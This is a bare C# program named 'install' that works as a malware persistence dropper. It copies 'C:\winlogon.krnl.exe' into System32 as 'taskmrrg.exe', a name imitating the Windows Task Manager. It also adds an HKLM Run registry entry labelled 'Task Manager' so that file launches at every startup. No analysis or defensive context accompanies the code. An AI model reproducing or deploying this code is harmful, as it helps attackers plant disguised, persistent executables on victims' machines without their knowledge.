using System;
using System.IO;
using Microsoft.Win32;

namespace install;

internal class Program
{
	private static void Main(string[] args)
	{
		Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Task Manager", Environment.SystemDirectory + "\\taskmrrg.exe", RegistryValueKind.String);
		File.Copy("C:\\winlogon.krnl.exe", Environment.SystemDirectory + "\\taskmrrg.exe");
	}
}
